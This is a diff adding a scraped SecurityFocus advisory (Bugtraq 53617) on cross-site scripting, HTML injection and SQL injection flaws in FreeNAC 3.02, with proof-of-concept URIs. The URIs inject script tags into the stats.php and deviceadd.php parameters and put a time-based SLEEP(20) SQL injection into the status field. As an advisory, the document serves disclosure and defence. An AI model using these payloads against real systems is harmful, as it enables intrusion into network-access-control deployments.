@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid53617<p><b><span style="font-size: 18pt;">FreeNAC Multiple Cross Site Scripting, HTML Injection and SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/53617/info">info</a><br><a href="http://www.securityfocus.com/bid/53617/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/53617/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/53617/solution">solution</a><br><a href="http://www.securityfocus.com/bid/53617/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				53617
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 19 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 19 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Blake
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					FreeNAC FreeNAC  3.02<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues through a browser. An attacker must trick an unsuspecting victim into following a malicious  URI to exploit the cross-site scripting issues. <br/> <br/>The following example URIs are available. <br/> <br/>Cross-site scripting: <br/> <br/>http://www.example.com/stats.php?graphtype=bar&amp;amp;type=vlan13&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; HTTP/1.1 <br/> <br/>HTML-injection: <br/> <br/>http://www.example.com/deviceadd.php?name=test&amp;amp;mac=0001.0001.0001&amp;amp;status=1&amp;amp;vlan=6&amp;amp;username=2&amp;amp;office=1&amp;amp;comment="&amp;gt;&amp;lt;script&amp;gt;alert(2)&amp;lt;/script&amp;gt;&amp;amp;action=Update&amp;amp;action_idx=1 <br/> <br/>SQL-Injection: <br/> <br/>http://www.example.com/deviceadd.php?name=test&amp;amp;mac=0001.0001.0001&amp;amp;status=1+AND+SLEEP(20)&amp;amp;vlan=6&amp;amp;username=2&amp;amp;office=1&amp;amp;comment=&amp;amp;action=Update&amp;amp;action_idx=1
+	
+		<ul>
+</ul>
+</div>
